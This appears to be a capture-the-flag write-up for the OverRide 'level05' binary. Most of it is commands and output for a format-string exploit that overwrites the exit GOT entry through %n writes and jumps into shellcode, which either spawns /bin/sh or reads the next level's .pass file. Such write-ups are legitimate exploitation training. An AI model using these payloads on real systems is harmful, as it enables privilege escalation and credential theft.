```
$> python -c "import struct; print('AAAABBBB' + '%x ' * 11)" | ./level05
aaaabbbb64 f7f39580 1 0 1 f7f99980 ffffffff 1 0 61616161 62626262
```

<pre>
echo | ltrace ./level05 1>&-
\__libc_start_main(0x8048444, 1, -10540, 0x8048520, 0x8048590 <unfinished ...>
<strong>fgets("\n", 100, 0xf7fcfac0)     = 0xffffd5c8</strong>
printf("\n")                     = 1
exit(0 <unfinished ...>
+++ exited (status 0) +++
</pre>

<pre>
level05@OverRide:~$ objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    \__gmon_start_\_
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   \__gmon_start_\_
<strong>080497e0 R_386_JUMP_SLOT   exit</strong>
080497e4 R_386_JUMP_SLOT   \__libc_start_main
</pre>

```
(python2.7 -c "import struct; print('jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814\$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' + 'AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%54672d' + '%22\$n' + '%10807d' + '%23\$n')") | ./level05
```

<pre>
$> env -i SHELLCODE="$SHELLCODE" SHELL=/bin/bash gdb ./level05
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x/2s \*\*(char\*\*\*)&environ
0xffffdf4e:      "SHELLCODE=jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"
0xffffdf97:      "SHELL=/bin/bash"
(gdb) x 0xffffdf4e + 10
0xffffdf58:      "jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"
</pre>

<pre>
(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%57205d' + '%11\$n' + '%8318d' + '%12\$n')") | env -i SHELLCODE="$(python -c "print('\x90' * 20 + 'jsh.pashl06/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')")" SHELL=/bin/bash ./level05
</pre>
